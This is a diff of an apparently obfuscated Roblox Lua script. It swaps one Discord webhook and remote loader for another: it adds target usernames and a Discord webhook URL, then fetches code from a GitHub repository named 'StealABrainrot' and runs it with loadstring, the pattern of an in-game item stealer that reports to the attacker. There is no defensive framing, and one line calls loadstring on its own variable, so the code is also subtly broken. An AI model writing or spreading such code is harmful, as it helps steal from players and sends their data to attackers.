@@ -1,4 +1,16 @@
-Username = "SH4RKSTORAGE29"
-Webhook = "https://discord.com/api/webhooks/1409108889554911385/VF9dfaWBYfcgN6P6rVhtRRElt1Di7uxCAZCS_piF990e2cuKanOLt6dSDlltbYs_7dGq"
+local fenv = getfenv()
 
-loadstring(game:HttpGet(“https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot”))()
+local var1 = ({
+    ...
+})
+_G.USERNAMES = {
+    "SH4RKSTORAGE29",
+    "SH4RKSTORAGE30"
+}
+_G.WEBHOOK_URL = "https://discord.com/api/webhooks/1418852739651207210/nQ8ybPPT9hDuXYLRYNyTlw2ybuizza4xLndNV3qfz6neVD1TMQ3q69TZvan72bEUHyY6"
+local var2 = game:HttpGet("https://raw.githubusercontent.com/swiftasfboi/StealABrainrot/refs/heads/main/main")
+local var3 = {
+    var2
+}
+local var4 = loadstring(var4)
+local var5, var6, var7, var8, var9, var10, var11, var12, var13, var14, var15, var16, var17, var18, var19, var20, var21, var22, var23, var24, var25, var26, var27, var28, var29, var30, var31, var32, var33, var34 = var4()
